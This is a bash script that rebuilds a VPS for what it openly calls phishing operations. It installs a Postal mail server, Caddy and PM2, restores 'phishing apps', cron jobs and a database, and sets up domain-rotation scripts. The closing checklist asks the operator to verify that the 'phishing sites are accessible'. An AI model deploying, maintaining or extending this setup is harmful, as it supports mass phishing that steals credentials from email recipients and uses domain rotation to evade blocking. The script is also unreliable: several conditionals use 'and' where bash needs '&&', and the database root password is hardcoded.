#!/bin/bash
set -e

echo "[1/7] Installing Core System Dependencies..."
apt-get update
apt-get install -y curl git ufw jq docker.io docker-compose-plugin

# Node.js & PM2 Setup
if ! command -v node &> /dev/null; then
    curl -fsSL https://deb.nodesource.com/setup_18.x | bash -
    apt-get install -y nodejs
    npm install -g pm2
fi

echo "[2/7] Restoring System Configurations & Cron..."
mkdir -p /opt/postal/config /opt/postal/caddy-data/apps
mkdir -p /opt/mailef-backend

# Restore configs to the right place
if [ -d "configs" ]; then
    cp -r configs/* /opt/postal/ 2>/dev/null || true
    # Move config files to the correct subdirectory
    if [ -f "/opt/postal/Caddyfile" ]; then mv /opt/postal/Caddyfile /opt/postal/config/; fi
    if [ -f "/opt/postal/postal.yml" ]; then mv /opt/postal/postal.yml /opt/postal/config/; fi
    if [ -f "/opt/postal/signing.key" ]; then mv /opt/postal/signing.key /opt/postal/config/; fi
    if [ -f "/opt/postal/apps-map.json" ]; then mv /opt/postal/apps-map.json /opt/postal/; fi
    if [ -f "/opt/postal/router.js" ]; then mv /opt/postal/router.js /opt/postal/; fi
    if [ -f "/opt/postal/rotate-domains.sh" ]; then mv /opt/postal/rotate-domains.sh /opt/postal/; chmod +x /opt/postal/rotate-domains.sh; fi
    if [ -f "/opt/postal/rotate-app.sh" ]; then mv /opt/postal/rotate-app.sh /opt/postal/; chmod +x /opt/postal/rotate-app.sh; fi
    if [ -f "/opt/postal/rotate-all-apps.sh" ]; then mv /opt/postal/rotate-all-apps.sh /opt/postal/; chmod +x /opt/postal/rotate-all-apps.sh; fi
fi

# Restore cron jobs
if [ -f "cron/staticroute" ]; then cp cron/staticroute /etc/cron.d/staticroute; chmod 644 /etc/cron.d/staticroute; fi
if [ -f "cron/root-crontab" ]; then crontab cron/root-crontab; fi

echo "[3/7] Restoring Phishing Application Files..."
if [ -d "apps" ] and [ "$(ls -A apps)" ]; then
    cp -r apps/* /opt/postal/caddy-data/apps/
    echo "Phishing apps restored to /opt/postal/caddy-data/apps/"
else
    echo "WARNING: No phishing apps found in backup. Sites will not work until apps are added manually."
fi

echo "[4/7] Configuring Firewall (UFW)..."
ufw default deny incoming
ufw default allow outgoing
ufw allow OpenSSH
ufw allow 80/tcp
ufw allow 443/tcp
ufw allow 25/tcp
ufw allow 587/tcp
ufw --force enable

echo "[5/7] Starting Containers & Restoring Database..."
# Check if docker-compose.yml exists
if [ -f "docker-compose.yml" ]; then
    docker compose up -d
    echo "Waiting for services to start..."
    sleep 10
    
    # Restore database if dump exists
    if [ -f "database/all_databases.sql" ] and [ -s "database/all_databases.sql" ]; then
        echo "Restoring database..."
        until docker exec postal-mariadb mariadb-admin ping -u root -ppostal --silent; do
            sleep 2
        done
        docker exec -i postal-mariadb mariadb -u root -ppostal < database/all_databases.sql
        echo "Database restored."
    else
        echo "WARNING: No database dump found. Database will be empty."
    fi
else
    echo "WARNING: docker-compose.yml not found. Containers not started."
fi

echo "[6/7] Re-configuring Caddy Container..."
# If Caddy container is not running, we need to set it up manually or via docker-compose
# Assuming your docker-compose.yml handles Caddy, this step might be skipped
# If Caddy was set up manually, you need to re-run the setup commands here
if ! docker ps | grep -q postal-caddy; then
    echo "WARNING: Caddy container not found. Manual setup required."
    echo "Please ensure your docker-compose.yml includes the Caddy service."
fi

echo "[7/7] Starting PM2 Services..."
if [ -d "/opt/mailef-backend" ] and [ -f "/opt/mailef-backend/dist/server.js" ]; then
    cd /opt/mailef-backend && npm install --production
    pm2 start dist/server.js --name mailer-backend
    echo "Backend service started."
else
    echo "WARNING: Backend files not found. PM2 service not started."
fi

if [ -f "/opt/postal/router.js" ]; then
    pm2 start /opt/postal/router.js --name central-router
    pm2 save
    pm2 startup systemd -u root --hp /root
    echo "Central router started."
else
    echo "WARNING: Router script not found. PM2 service not started."
fi

echo ""
echo "=== VPS Restoration Complete! ==="
echo "IMPORTANT: Verify the following manually:"
echo "1. Check if Caddy container is running: docker ps"
echo "2. If not, manually set up Caddy or update docker-compose.yml"
echo "3. Verify phishing sites are accessible"
echo "4. Check cron jobs: crontab -l"
echo "5. Test domain rotation: /opt/postal/rotate-all-apps.sh (manual test)"
